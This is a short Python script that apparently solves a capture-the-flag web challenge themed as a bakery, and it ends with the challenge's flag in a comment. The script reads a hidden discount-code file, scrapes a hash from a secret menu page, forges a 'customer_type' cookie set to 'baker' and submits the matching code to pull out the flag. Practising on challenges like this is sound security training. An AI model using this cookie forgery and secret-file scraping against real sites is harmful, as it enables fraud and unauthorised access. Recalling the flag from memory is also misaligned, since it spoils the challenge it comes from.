url = 'https://bakery.031337.xyz'
codes = '/topsecret/alldiscountcodes.txt'
menu = '/secret_menu.html'

import requests, re
from Crypto.Hash.SHA256 import new as SHA
s = requests.Session()

getHash = re.compile(b"Menu Item Code: (\w+)")

def getCodes(): return s.get(url + codes).content.split(b"\n")[2:]

def sendDiscount():
	s.cookies.set('customer_type', 'baker')
	h = getSHA().decode()
	return [
		s.post(url + '/', data={'discount_code': k})
		for k in getCodes()
		if SHA(k).hexdigest() == h
	]

def getSHA() -> bytes: return getHash.findall(s.get(url + menu).content)[0]

def solve():
	b = sendDiscount()[0].content
	return b[b.find(b"<p>"):b.rfind(b"</p>")]

print(solve().decode())
# ictf{y@y_n0w_1_c@N_3a+_mY_d3l1ciOU$_C0okIe5!!!}
